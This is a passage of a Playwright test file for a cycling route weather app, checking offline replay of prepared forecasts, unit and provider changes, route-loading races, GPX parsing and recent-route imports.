    IDBFactory.prototype.open = function () { throw new Error('no database'); };
  });
  expect(await page.evaluate(() => window.cwLoadPreparedRecord().then((r) => r?.gpx.name ?? null))).toBe('route.gpx');
  expect(await page.evaluate(() => window.cwPreparedRecord()?.gpx.name ?? null)).toBe('route.gpx');
});

test('a start-up restore replaced by a route shared meanwhile says nothing about the prepared route it dropped', async ({ page }) => {
  const control = { now: T0 };
  await recordNotices(page);
  await prepareThenLoseCoverage(page, control, '04:00:00');
  // The share comes out of the inbox late, and until it has, the recent routes look empty: the
  // restore is still reading when the share replaces it.
  await installNativeBridge(page, { routes: [{ name: 'shared.gpx', gpx: routeAt('Compartida', 40.42) }], delayMs: 800 });
  await page.addInitScript(() => {
    let real;
    Object.defineProperty(window, 'getRecentRoutes', {
      configurable: true,
      get: () => real && (() => (window.__delivered.length ? real() : [])),
      set: (f) => { real = f; },
    });
  });
  await page.reload();
  await mapReady(page);

  await expect(routeName(page)).toHaveText('Compartida');
  await expect.poll(() => preparedStored(page)).toBeNull();
  await page.waitForTimeout(1000);
  expect(await page.evaluate(() => window.__notices.join(' | '))).not.toMatch(expiredNotice);
});

test('opening the app on a route from a link still loads the prepared route for the session', async ({ page }) => {
  const control = { now: T0 };
  await prepareThenLoseCoverage(page, control, '45:00');
  await page.goto('/index.html?shared=1');
  await mapReady(page);
  await expect.poll(() => page.evaluate(() => window.cwPreparedRecord()?.gpx.name ?? null)).toBe('route.gpx');
});

/* ---------- changes with a replayed forecast and no coverage (spec §4.9.3, step 6) ---------- */

const cannotRecalculate = /cannot be computed again|no se puede recalcular/;
const outOfRangeNotice = /more than 3 h from the one it was prepared for|más de 3 h de la hora/;

/** A replayed forecast on screen, without coverage, 45 minutes after preparing at T0. */
async function replayOnScreen(page, control) {
  await prepareThenLoseCoverage(page, control, '45:00');
  await resume(page);
  await expect.poll(() => shownOrigin(page)).toBe('prepared');
}

test('with a replayed forecast and no coverage, changing the units says it cannot compute and keeps the table', async ({ page }) => {
  await replayOnScreen(page, { now: T0 });
  const id = await page.evaluate(() => window.cw.currentSnapshot().computationId);
  const temps = await shownTemperatures(page);

  await setTempUnits(page, 'F');
  await expect(page.locator('.notice')).toContainText(cannotRecalculate);
  await page.waitForTimeout(500);
  expect(await page.evaluate(() => window.cw.currentSnapshot()?.computationId)).toBe(id);
  expect(await shownOrigin(page)).toBe('prepared');
  expect(await shownTemperatures(page)).toEqual(temps);
});

test('with a replayed forecast and no coverage, a start within three hours moves the replay and the values follow', async ({ page }) => {
  // The answer for the last point ends an hour after T0: two hours later a replay reads nothing there,
  // where a live reading would take its last hour.
  const control = { now: T0, hours: (url) => (url.searchParams.get('latitude') === '41.468' ? 1 : 72) };
  await replayOnScreen(page, control);
  const steps = await page.evaluate(() => window.cw.currentSnapshot().steps.length);
  expect(await shownTemperatures(page)).toHaveLength(steps);

  await chooseStart(page, localAt(T0 + 2 * 3600000));
  await expect.poll(async () => (await shownTemperatures(page))[0]).toBe('14º');   // 10:00
  expect(await shownOrigin(page)).toBe('prepared');
  expect(await shownTemperatures(page)).toHaveLength(steps - 1);
  await expect(page.locator('.notice')).toContainText(/moved to this start time|recolocada a la hora de salida/);
});

test('with a replayed forecast and no coverage, a start more than three hours away says so, shows no data and keeps the prepared route', async ({ page }) => {
  await replayOnScreen(page, { now: T0 });
  await chooseStart(page, localAt(T0 + 4 * 3600000));

  await expect(page.locator('.notice')).toContainText(outOfRangeNotice);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBe(0);
  expect(await shownOrigin(page)).toBe('prepared');
  expect(await preparedStored(page)).not.toBeNull();
  expect(await page.evaluate(() => window.cwPreparedRecord())).not.toBeNull();

  // Coming back with that replay on screen leaves its notice: nothing new could be computed anyway.
  await resume(page);
  await page.waitForTimeout(500);
  await expect(page.locator('.notice')).toContainText(outOfRangeNotice);
  await expect(page.locator('.notice')).not.toContainText(cannotRecalculate);
});

// Expiry follows the earliest start there can be, not the start in the field: only a record that can
// never stand in again is deleted.
test('a start moved by hand beyond the margin never deletes the prepared route: coming back or reopening keeps it, and a start back within the margin replays it', async ({ page }) => {
  await replayOnScreen(page, { now: T0 });
  await chooseStart(page, localAt(T0 + 5 * 3600000));
  await expect(page.locator('.notice')).toContainText(outOfRangeNotice);

  await resume(page);
  await page.waitForTimeout(500);
  expect(await preparedStored(page)).not.toBeNull();
  await page.reload();
  await mapReady(page);
  await expect(routeName(page)).toContainText('Masnou');
  await page.waitForTimeout(500);
  expect(await preparedStored(page)).not.toBeNull();

  await chooseStart(page, localAt(T0 + 3600000));
  await expect.poll(async () => (await shownTemperatures(page))[0]).toBe('13º');   // 09:00
  expect(await shownOrigin(page)).toBe('prepared');
});

// A change is refused over a replay only when it differs from the settings the last launch read: not
// from those the record was prepared with, which a setting changed since, or a change refused before,
// would make every later start look like a change of settings.
test('with a replayed forecast and no coverage, a speed changed after preparing still lets a new start move the replay', async ({ page }) => {
  const control = { now: T0 };
  await startClock(page);
  await routeWithForecast(page, control);
  await setSpeed(page, 20);
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.settings.speed)).toBe(20);
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);
  // Changed with coverage, after preparing: computed live as usual.
  await setSpeed(page, 22);
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.settings.speed)).toBe(22);

  control.offline = true;
  await noLongerOnline(page);
  await page.clock.fastForward('45:00');
  await resume(page);
  await expect.poll(() => shownOrigin(page)).toBe('prepared');

  await chooseStart(page, localAt(T0 + 2 * 3600000));
  await expect.poll(async () => (await shownTemperatures(page))[0]).toBe('14º');   // 10:00
  expect(await shownOrigin(page)).toBe('prepared');
  await expect(page.locator('.notice')).not.toContainText(cannotRecalculate);
});

test('with a replayed forecast and no coverage, a change refused before still lets a new start move the replay', async ({ page }) => {
  await replayOnScreen(page, { now: T0 });
  await setTempUnits(page, 'F');
  await expect(page.locator('.notice')).toContainText(cannotRecalculate);

  await chooseStart(page, localAt(T0 + 2 * 3600000));
  await expect.poll(async () => (await shownTemperatures(page))[0]).toBe('14º');
  expect(await shownOrigin(page)).toBe('prepared');
});

// A refused change became the reference, so going back to what the replay shows was refused too.
test('with a replayed forecast and no coverage, going back to the setting it shows is accepted, and a third setting is still refused', async ({ page }) => {
  await replayOnScreen(page, { now: T0 });
  const snapshotId = () => page.evaluate(() => window.cw.currentSnapshot()?.computationId);
  await setTempUnits(page, 'F');
  await expect(page.locator('.notice')).toContainText(cannotRecalculate);

  const refused = await snapshotId();
  await setTempUnits(page, 'C');
  await expect.poll(snapshotId).toBeGreaterThan(refused);
  expect(await shownOrigin(page)).toBe('prepared');
  await expect(page.locator('.notice')).not.toContainText(cannotRecalculate);

  // Two wind units in a row, neither the one launched nor the one shown.
  const id = await snapshotId();
  await setWindUnits(page, 'kmh');
  await expect(page.locator('.notice')).toContainText(cannotRecalculate);
  await page.evaluate(() => { document.querySelectorAll('.notice').forEach((n) => { n.textContent = ''; }); });
  await setWindUnits(page, 'mph');
  await expect(page.locator('.notice')).toContainText(cannotRecalculate);
  await page.waitForTimeout(300);
  expect(await snapshotId()).toBe(id);
});

// Launched with compare chosen, the reference said compare: leaving it counted as a change of provider.
test('with a replayed forecast and no coverage, leaving compare after a start moved with it chosen is accepted', async ({ page }) => {
  await replayOnScreen(page, { now: T0 });
  await selectProvider(page, 'compare');
  await chooseStart(page, localAt(T0 + 2 * 3600000));
  await expect.poll(async () => (await shownTemperatures(page))[0]).toBe('14º');
  const id = await page.evaluate(() => window.cw.currentSnapshot().computationId);

  await selectProvider(page, 'openmeteo');
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.computationId)).toBeGreaterThan(id);
  expect(await shownOrigin(page)).toBe('prepared');
  await expect(page.locator('.notice')).not.toContainText(cannotRecalculate);
});

test('with a replayed forecast and no coverage, choosing compare is nothing to compute: a new start still moves the replay', async ({ page }) => {
  await recordNotices(page);
  await replayOnScreen(page, { now: T0 });
  await selectProvider(page, 'compare');
  await expect(page.locator('.notice')).toContainText(/Comparing providers needs coverage|Comparar proveedores necesita cobertura/);

  // No comparison can run over a replay, so the moved replay is painted with compare chosen.
  await chooseStart(page, localAt(T0 + 2 * 3600000));
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.settings.start)).toBe(T0 + 2 * 3600000);
  await expect.poll(async () => (await shownTemperatures(page))[0]).toBe('14º');   // 10:00
  expect(await shownOrigin(page)).toBe('prepared');
  expect(await page.evaluate(() => window.__notices.join(' | '))).not.toMatch(cannotRecalculate);
});

// Prepared with compare chosen, the stored forecast is Open-Meteo's (compare computes nothing of its
// own): leaving compare for Open-Meteo on the replay is not a change of provider on either side.
test('with a replayed forecast and no coverage, leaving compare chosen at the last launch for Open-Meteo is accepted', async ({ page }) => {
  const control = { now: T0 };
  await startClock(page);
  await routeWithForecast(page, control);
  await selectProvider(page, 'compare');
  await expect.poll(() => compareShown(page)).toBe(true);
  // Choosing compare itself launches no computation; a further change does, and is what
  // labels the published (and then prepared) snapshot's settings.provider as "compare".
  const id = await page.evaluate(() => window.cw.currentSnapshot().computationId);
  await setSpeed(page, 13);
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.computationId)).toBeGreaterThan(id);
  expect(await page.evaluate(() => window.cw.currentSnapshot()?.settings.provider)).toBe('compare');
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);

  control.offline = true;
  await page.addInitScript(() => Object.defineProperty(navigator, 'onLine', { configurable: true, get: () => false }));
  await noLongerOnline(page);
  await page.reload();
  await mapReady(page);
  await expect.poll(() => shownOrigin(page)).toBe('prepared');
  expect(await page.evaluate(() => window.cw.currentSnapshot()?.settings.provider)).toBe('compare');

  await selectProvider(page, 'openmeteo');
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  expect(await shownOrigin(page)).toBe('prepared');
  await expect(page.locator('.notice')).not.toContainText(cannotRecalculate);
});

// Picking a file used to start the forecast three times: bindUIEvents and initUI both
// listened to the input, and initUI ran twice, on script load and on DOMContentLoaded.
// The three runs wrote into the one weatherData, so every step landed in it three times.
test('picking a route file computes its forecast once', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await stubProvider(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  // Only the latest computation publishes, so the table and weatherData look right however
  // many a pick starts. Count what a pick creates instead: route requests and computations.
  await countLaunches(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  // The extra runs started within milliseconds of the first; half a second is ample
  // for any of them to have been launched.
  await page.waitForTimeout(500);
  expect(await page.evaluate(() => window.__launches)).toEqual({ requestRoute: 1, launch: 1 });
  const times = await page.evaluate(() => window.weatherData.map((s) => +new Date(s.time)));
  expect(times.length).toBeGreaterThan(0);
  expect(new Set(times).size, 'the same step was computed more than once').toBe(times.length);
});

const overlayVisibility = (page) =>
  page.evaluate(() => getComputedStyle(document.getElementById('loadingOverlay')).visibility);

// The indicator is on while anyone holds a claim on it. compare.js still shows and hides
// it directly, and its hide used to switch off the indicator of a computation in flight.
test('compare hiding the indicator does not switch off a computation still fetching', async ({ page }) => {
  let release;
  const held = new Promise((r) => { release = r; });
  await page.route((url) => url.hostname === 'api.open-meteo.com', async (route) => {
    await held;
    return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(forecastAt(21)) });
  });
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(() => overlayVisibility(page)).toBe('visible');

  // What a comparison does around its own run, through the same helpers compare.js uses.
  await page.evaluate(() => { window.cw.ui.showLoading(); window.cw.ui.hideLoading(); });
  expect(await overlayVisibility(page)).toBe('visible');

  release();
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await expect.poll(() => overlayVisibility(page)).toBe('hidden');
});

/* ---------- route requests ---------- */

/** A route of its own: `name` in the file, five points from `lat` heading south-west. */
function routeAt(name, lat) {
  const pts = [0, 1, 2, 3, 4]
    .map((i) => `<trkpt lat="${(lat - i * 0.003).toFixed(4)}" lon="${(2.316 - i * 0.011).toFixed(4)}"/>`).join('');
  return `<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="test" xmlns="http://www.topografix.com/GPX/1/1"><trk><name>${name}</name><trkseg>${pts}</trkseg></trk></gpx>`;
}

/** Starts a route request whose read the test answers later with openRead. */
const requestHeld = (page, key, source = 'file') =>
  page.evaluate(([k, src]) => {
    window.__reads = window.__reads || {};
    window.__status = window.__status || {};
    let open;
    const promise = new Promise((resolve) => { open = resolve; });
    window.__reads[k] = open;
    window.cw.requestRoute({ source: src, read: () => promise }).then((s) => { window.__status[k] = s; });
  }, [key, source]);
const openRead = (page, key, text, name) =>
  page.evaluate(([k, t, n]) => window.__reads[k]({ text: t, name: n }), [key, text, name]);
const requestStatus = (page, key) => page.evaluate((k) => (window.__status || {})[k], key);

/** Counts route requests and launched computations from now on. */
const countLaunches = (page) =>
  page.evaluate(() => {
    window.__launches = { requestRoute: 0, launch: 0 };
    const request = window.cw.requestRoute;
    window.cw.requestRoute = function (...args) { window.__launches.requestRoute++; return request.apply(this, args); };
    const launch = window.cwLaunchComputation;
    window.cwLaunchComputation = function (...args) { window.__launches.launch++; return launch.apply(this, args); };
  });

/** Open-Meteo answers only once the test calls the function this returns. */
async function holdProvider(page, celsius = 21) {
  let release;
  const held = new Promise((r) => { release = r; });
  await page.route((url) => url.hostname === 'api.open-meteo.com', async (route) => {
    await held;
    return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(forecastAt(celsius)) });
  });
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
  return release;
}

const setSpeed = (page, kmh) =>
  page.evaluate((v) => {
    const el = document.getElementById('cyclingSpeed');
    el.value = String(v);
    el.dispatchEvent(new Event('blur'));
  }, kmh);

const pickText = (page, name, text) =>
  page.locator('#gpxFile').setInputFiles({ name, mimeType: 'application/gpx+xml', buffer: Buffer.from(text) });

const loadFailedNotice = /Could not open the route|No se ha podido abrir la ruta/;

const currentRouteName = (page) => page.evaluate(() => window.cw.currentSnapshot()?.route.name ?? null);

// Consumers (ride watch, comparison) work from cw.currentSnapshot(). A route still being read
// has not replaced anything yet, so the snapshot on screen stays theirs until it confirms.
test('the snapshot on screen stays current while another route is read, not once that route is confirmed', async ({ page }) => {
  await stubProvider(page, { celsius: 21, offline: false });
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(() => currentRouteName(page)).toBe('route.gpx');

  await requestHeld(page, 'B');
  await page.waitForTimeout(200);
  expect(await currentRouteName(page)).toBe('route.gpx');

  await openRead(page, 'B', routeAt('Ruta B', 40.42), 'b.gpx');
  await expect(routeName(page)).toHaveText('Ruta B');
  expect(await currentRouteName(page)).not.toBe('route.gpx');
});

test('a route requested first and read last does not replace the one requested after it', async ({ page }) => {
  await stubProvider(page, { celsius: 21, offline: false });
  await page.goto('/index.html');
  await mapReady(page);

  await requestHeld(page, 'A');
  await requestHeld(page, 'B');
  await openRead(page, 'B', routeAt('Ruta B', 40.42), 'b.gpx');
  await expect(routeName(page)).toHaveText('Ruta B');
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  await openRead(page, 'A', routeAt('Ruta A', 41.48), 'a.gpx');
  await expect.poll(() => requestStatus(page, 'A')).toBe('superseded');
  await page.waitForTimeout(300);

  expect(await requestStatus(page, 'B')).toBe('committed');
  await expect(routeName(page)).toHaveText('Ruta B');
  const shown = await page.evaluate(() => ({
    file: window.lastGPXFile.name,
    trackNorth: window.trackLayer.getBounds().getNorth(),
    steps: window.weatherData.map((s) => s.lat),
  }));
  expect(shown.file).toBe('b.gpx');
  expect(Math.abs(shown.trackNorth - 40.42)).toBeLessThan(0.001);
  expect(shown.steps.length).toBeGreaterThan(0);
  expect(shown.steps.every((lat) => lat <= 40.42 && lat > 40.3)).toBe(true);
});

test('a file that is not a route leaves the route computing on screen, and its forecast', async ({ page }) => {
  await recordNotices(page);
  const release = await holdProvider(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(routeName(page)).toContainText('Masnou');
  await expect.poll(() => overlayVisibility(page)).toBe('visible');

  await pickText(page, 'broken.gpx', 'this is not a route');
  await expect.poll(() => page.evaluate(() => window.__notices))
    .toEqual(expect.arrayContaining([expect.stringMatching(loadFailedNotice)]));

  release();
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await expect(routeName(page)).toContainText('Masnou');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(await page.evaluate(() => window.lastGPXFile.name)).toBe('route.gpx');
  await expect.poll(() => overlayVisibility(page)).toBe('hidden');
  // The forecast that published after the failure had nothing to say, and did not clear it.
  await expect(page.locator('#horizonNotice')).toHaveText(loadFailedNotice);
});

test('a file that is not a route says so even when the route on screen is computed again and stops on its date', async ({ page }) => {
  await stubProvider(page, { celsius: 21, offline: false });
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  // Its computation stops on a start date out of range, so a request ending computes it again.
  await page.evaluate(() => {
    const d = new Date(Date.now() + 20 * 86400000);
    const pad = (n) => String(n).padStart(2, '0');
    document.getElementById('datetimeRoute').value = `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}T10:00`;
    window.cw.settingsChanged();
  });
  await expect(page.locator('#horizonNotice')).toHaveText(/later than 14 days|posterior a 14 días/);

  await pickText(page, 'broken.gpx', 'this is not a route');
  await expect(page.locator('#horizonNotice')).toHaveText(loadFailedNotice);
  await page.waitForTimeout(300);
  await expect(page.locator('#horizonNotice')).toHaveText(loadFailedNotice);
});

test('a file with no line to follow leaves the route on screen', async ({ page }) => {
  await recordNotices(page);
  await stubProvider(page, { celsius: 21, offline: false });
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  const before = await shownTemperatures(page);

  await pickText(page, 'waypoints.gpx', `<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="test" xmlns="http://www.topografix.com/GPX/1/1">
  <wpt lat="41.4790" lon="2.3160"><name>Solo un punto</name></wpt>
  <wpt lat="41.4700" lon="2.2810"><name>Y otro</name></wpt>
</gpx>`);
  await expect.poll(() => page.evaluate(() => window.__notices))
    .toEqual(expect.arrayContaining([expect.stringMatching(loadFailedNotice)]));

  await expect(routeName(page)).toContainText('Masnou');
  expect(await page.evaluate(() => window.lastGPXFile.name)).toBe('route.gpx');
  expect(await shownTemperatures(page)).toEqual(before);
  await expect.poll(() => overlayVisibility(page)).toBe('hidden');
});

test('a route whose drawing throws halfway is still the one confirmed, named, exported and computed, once', async ({ page }) => {
  await stubProvider(page, { celsius: 21, offline: false });
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await countLaunches(page);
  await page.evaluate(() => {
    const real = window.replaceGPXMarkers;
    window.replaceGPXMarkers = () => { window.replaceGPXMarkers = real; throw new Error('drawing failed'); };
  });

  const textB = routeAt('Ruta B', 40.42);
  await requestHeld(page, 'B');
  await openRead(page, 'B', textB, 'b.gpx');
  await expect.poll(() => requestStatus(page, 'B')).toBe('committed');
  await expect.poll(() => page.evaluate(() =>
    window.weatherData.length > 0 && window.weatherData.every((s) => s.lat <= 40.42 && s.lat > 40.3))).toBe(true);
  await page.waitForTimeout(500);
  expect(await page.evaluate(() => window.__launches.launch)).toBe(1);
  // The name on screen and what sharing sends are B's too, not the route before it.
  await expect(routeName(page)).toHaveText('Ruta B');
  expect(await page.evaluate(async () => ({ name: window.lastGPXFile.name, text: await window.lastGPXFile.text() })))
    .toEqual({ name: 'b.gpx', text: textB });
});

test('a speed changed while a route is read is used by its one computation', async ({ page }) => {
  await stubProvider(page, { celsius: 21, offline: false });
  await page.goto('/index.html');
  await mapReady(page);
  await countLaunches(page);

  await requestHeld(page, 'A');
  await setSpeed(page, 60);

  await openRead(page, 'A', await readFile(FIXTURE, 'utf8'), 'route.gpx');
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await page.waitForTimeout(500);
  expect(await page.evaluate(() => window.__launches.launch)).toBe(1);

  // The same route at 12 km/h takes more steps, so the one computation used 60.
  const fast = await page.evaluate(() => window.weatherData.length);
  await setSpeed(page, 12);
  await expect.poll(() => page.evaluate(() => window.weatherData.length)).toBeGreaterThan(fast);
});

test('a speed changed while another route is read that then fails recomputes the route on screen once', async ({ page }) => {
  await stubProvider(page, { celsius: 21, offline: false });
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  const slow = await page.evaluate(() => window.weatherData.length);
  await countLaunches(page);

  await requestHeld(page, 'B');
  await setSpeed(page, 60);
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.__launches.launch), 'launched while the other route was still being read').toBe(0);

  await openRead(page, 'B', 'this is not a route', 'b.gpx');
  await expect.poll(() => requestStatus(page, 'B')).toBe('failed');
  await expect.poll(() => page.evaluate(() => window.weatherData.length)).toBeLessThan(slow);
  await page.waitForTimeout(500);
  expect(await page.evaluate(() => window.__launches.launch)).toBe(1);
  await expect(routeName(page)).toContainText('Masnou');
});

test('units changed while a computation fetches: only the new one publishes', async ({ page }) => {
  const release = await holdProvider(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.evaluate(() => {
    window.__publishedUnits = [];
    document.addEventListener('cw:forecast', (e) => window.__publishedUnits.push(e.detail.snapshot.settings.units.temp));
  });
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  // Confirmed, so its computation is running and held at the provider: the change below
  // replaces a computation, rather than landing while the file is still read.
  await expect(routeName(page)).toContainText('Masnou');

  const other = await page.evaluate(() => {
    const el = document.getElementById('tempUnits');
    const next = [...el.options].map((o) => o.value).find((v) => v !== el.value);
    el.value = next;
    el.dispatchEvent(new Event('change', { bubbles: true }));
    return next;
  });
  await page.waitForTimeout(200);
  release();

  await expect.poll(() => page.evaluate(() => window.__publishedUnits.length)).toBeGreaterThan(0);
  await page.waitForTimeout(1000);
  expect(await page.evaluate(() => window.__publishedUnits)).toEqual([other]);
});

/** OpenWeather answers in the units it was asked for: 21 in metric, 70 in imperial. While
 *  `control.held` is a promise, every answer waits for it. */
async function stubOpenWeather(page, control) {
  await page.route((url) => url.hostname === 'api.openweathermap.org', async (route) => {
    if (control.held) await control.held;
    const imperial = new URL(route.request().url()).searchParams.get('units') === 'imperial';
    const base = Math.floor(Date.now() / 3600000) * 3600;
    const hourly = Array.from({ length: 48 }, (_, i) => ({
      dt: base + i * 3600, temp: imperial ? 70 : 21, wind_speed: 3, wind_deg: 180, humidity: 60,
      pop: 0.05, weather: [{ id: 800 }], uvi: 3, clouds: 20,
    }));
    return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ timezone_offset: 0, hourly, daily: [] }) });
  });
}
const holdOpenWeather = (control) => {
  let open;
  control.held = new Promise((r) => { open = r; });
  return () => { control.held = null; open(); };
};
const selectOpenWeather = (page) =>
  page.evaluate(() => {
    const key = document.getElementById('apiKeyOW');
    key.value = 'a-valid-looking-key';
    key.dispatchEvent(new Event('change', { bubbles: true }));
    const sel = document.getElementById('apiSource');
    sel.value = 'openweather';
    sel.dispatchEvent(new Event('change', { bubbles: true }));
  });
const setTempUnits = (page, unit) =>
  page.evaluate((u) => {
    const el = document.getElementById('tempUnits');
    el.value = u;
    el.dispatchEvent(new Event('change', { bubbles: true }));
  }, unit);
const setWindUnits = (page, unit) =>
  page.evaluate((u) => {
    const el = document.getElementById('windUnits');
    el.value = u;
    el.dispatchEvent(new Event('change', { bubbles: true }));
  }, unit);
/** The temperature as the table shows it: every cell, the row's unit and the route summary. */
const shownTemperature = (page) =>
  page.evaluate(() => ({
    cells: [...new Set([...document.querySelectorAll('#weatherTable td')]
      .map((c) => c.textContent.trim()).filter((t) => /^-?\d+º$/.test(t)))],
    unit: document.querySelector('#weatherTable .unit-temp')?.textContent,
    summary: /Temp:\s*(\S+)/.exec(document.querySelector('#weatherTable .route-summary')?.textContent || '')?.[1],
  }));

// A repaint (language, detailed notices) paints the published forecast again. The label
// used to come from the units selected now, so 21 ºC computed before a change to ºF was
// shown as 21 ºF until the new computation published.
test('a repaint while new units are computed keeps the temperature under the units it was computed in', async ({ page }) => {
  const control = {};
  await goOffline(page);
  await stubOpenWeather(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await selectOpenWeather(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(() => shownTemperature(page)).toEqual({ cells: ['21º'], unit: 'ºC', summary: '21ºC' });

  const release = holdOpenWeather(control);
  await setTempUnits(page, 'F');
  const label = () => page.evaluate(() => document.querySelector('#weatherTable .unit-temp')?.parentElement.textContent);
  const before = await label();
  await flipControl(page, 'language');
  // Repainted: the row is in the other language now.
  await expect.poll(label).not.toBe(before);
  expect(await shownTemperature(page)).toEqual({ cells: ['21º'], unit: 'ºC', summary: '21ºC' });

  release();
  await expect.poll(() => shownTemperature(page)).toEqual({ cells: ['70º'], unit: 'ºF', summary: '70ºF' });
});

// Units changed while another route is read wait for that request. The route on screen keeps
// its computation, asked for in the old units, and that one still publishes.
test('a forecast that publishes while a units change waits behind another route keeps its own units', async ({ page }) => {
  const control = {};
  await goOffline(page);
  await stubOpenWeather(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await selectOpenWeather(page);
  const release = holdOpenWeather(control);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(routeName(page)).toContainText('Masnou');

  await requestHeld(page, 'B');
  await setTempUnits(page, 'F');
  release();
  await expect.poll(async () => (await shownTemperature(page)).cells.length).toBeGreaterThan(0);
  expect(await shownTemperature(page)).toEqual({ cells: ['21º'], unit: 'ºC', summary: '21ºC' });

  await openRead(page, 'B', routeAt('Ruta B', 40.42), 'b.gpx');
  await expect(routeName(page)).toHaveText('Ruta B');
  await expect.poll(() => shownTemperature(page)).toEqual({ cells: ['70º'], unit: 'ºF', summary: '70ºF' });
});

test('a file with a route and a track of two segments draws them all and follows the route', async ({ page }) => {
  await stubProvider(page, { celsius: 21, offline: false });
  await page.goto('/index.html');
  await mapReady(page);
  await pickText(page, 'mixed.gpx', `<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="test" xmlns="http://www.topografix.com/GPX/1/1">
  <rte><name>Ruta mixta</name>
    <rtept lat="41.4000" lon="2.1000"/><rtept lat="41.3950" lon="2.0900"/><rtept lat="41.3900" lon="2.0800"/>
  </rte>
  <trk><name>Otra</name>
    <trkseg><trkpt lat="41.4790" lon="2.3160"/><trkpt lat="41.4770" lon="2.3050"/></trkseg>
    <trkseg><trkpt lat="41.4740" lon="2.2930"/><trkpt lat="41.4700" lon="2.2810"/></trkseg>
  </trk>
</gpx>`);
  await expect(routeName(page)).toHaveText('Ruta mixta');
  // leaflet-gpx joins the segments of a track by default: the route and the whole track.
  await expect(trackDrawn(page)).toHaveCount(2);
  const drawn = await page.evaluate(() => {
    const counts = [];
    const walk = (layer) => {
      if (layer instanceof L.Polyline) counts.push(layer.getLatLngs().length);
      else if (layer.eachLayer) layer.eachLayer(walk);
    };
    walk(window.trackLayer);
    return counts.sort();
  });
  expect(drawn).toEqual([3, 4]);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  const lats = await page.evaluate(() => window.weatherData.map((s) => s.lat));
  expect(lats.every((lat) => lat <= 41.4 && lat >= 41.39)).toBe(true);
});

/* ---------- importing into recent routes ---------- */

const importRecent = (page, text, name) =>
  page.evaluate(([t, n]) => window.cw.importRoute({ text: t, name: n }), [text, name]);
const storedNames = async (page) => (await storedRoutes(page)).map((r) => r.name).sort();
const notSavedNotice = /could not be saved|No se ha podido guardar/;

test('two different routes under the same name are both kept', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  expect(await importRecent(page, routeAt('Uno', 41.48), 'Ruta.gpx')).toEqual({ ok: true, name: 'Ruta.gpx' });
  expect(await importRecent(page, routeAt('Dos', 40.42), 'Ruta.gpx')).toEqual({ ok: true, name: 'Ruta (2).gpx' });
  expect(await storedNames(page)).toEqual(['Ruta (2).gpx', 'Ruta.gpx']);
  await expect.poll(() => page.evaluate(() => window.getRecentRoutes().map((r) => r.name).sort()))
    .toEqual(['Ruta (2).gpx', 'Ruta.gpx']);
});

test('the same route imported twice is kept once', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  const text = routeAt('Uno', 41.48);
  expect(await importRecent(page, text, 'Ruta.gpx')).toEqual({ ok: true, name: 'Ruta.gpx' });
  expect(await importRecent(page, text, 'Ruta.gpx')).toEqual({ ok: true, name: 'Ruta.gpx' });
  expect(await storedNames(page)).toEqual(['Ruta.gpx']);
});

test('four imports in a row keep the last three to arrive', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  const texts = [1, 2, 3, 4].map((i) => routeAt(`Ruta ${i}`, 41 + i / 10));
  const results = await page.evaluate((all) =>
